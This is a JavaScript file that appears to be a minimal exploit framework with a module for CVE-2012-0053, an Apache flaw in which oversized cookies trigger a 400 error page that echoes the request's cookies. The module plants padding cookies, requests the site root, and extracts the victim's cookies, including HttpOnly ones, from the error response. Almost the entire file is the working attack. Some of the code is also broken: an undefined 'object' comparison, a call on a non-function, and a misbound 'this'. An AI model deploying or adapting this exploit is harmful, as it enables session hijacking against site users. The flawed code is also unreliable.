var _XL = {
    'find' : function (needle, haystack) {
        if (haystack === undefined) {
            haystack = this;
        }
        var sub_test = needle.split(".",2);
        
        if (!(sub_test[0] in haystack)) {
            return false;
        }

        var module = haystack[sub_test[0]];
        
        if (sub_test.length > 1) {
            return this.find(sub_test[1], module);
        }
        return module;
    },
    'init' : function () {
        for (var i=0; i<this.settings.modules.length; i++) {
            var module = this.find(this.settings.modules[i]);
            if (module === object) {
                
                module();
            }
        }
    }
};

_XL.exploits = {};

_XL.exploits.CVE_2012_0053 = {
    // Most browsers limit cookies to 4k characters, so we need multiple
    setCookies : function (good) {
        // Construct string for cookie value
        var str = "";
        while (str.length < 819) {
            str += "x";
        }
    
        // Set cookies
        for (var i = 0; i < 10; i++) {
            // Evil cookie string
            var _cookie = "xss"+i+"="+str+";path=/";
            
            // Expire cookie
            if (good) {
                _cookie += ";expires="+new Date(1).toUTCString()+";";
            }
            
            // Set cookie
            document.cookie = _cookie;
        }
    },

    parseCookies : function () {
        var cookie_dict = {};
        // Only react on 400 status
        if (this.readyState === 4 && this.status === 400) {
            // Replace newlines and match <pre> content
            var content = this.responseText.replace(/\r|\n/g,'').match(/pre>(.+)<\/pre/);
            if (content) {
                // Remove 'Cookie: ' prefix
                content = content[1].substr(8);
                // Remove evil cookies from content
                var cookies = content.replace(/xss\d=x+;?/g, '').split(/;/);
                // Add cookie key/value to object
                for (var i=0; i<cookies.length; i++) {
                    var s_c = cookies[i].split('=',2);
                    cookie_dict[s_c[0]] = s_c[1];
                }
            }
            // Unset evil cookies
            this.setCookies(true);
            alert(JSON.stringify(cookie_dict));
        }
    },

    init : function () {
        this.setCookies();
        // Make XHR request
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = this.parseCookies;
        xhr.open("GET", "/", true);
        xhr.send(null);
    }
};

_XL.cookies = {};


_XL.settings = {
    modules : [
        'exploits.CVE_2012_0053'
    ]
};

_XL.init();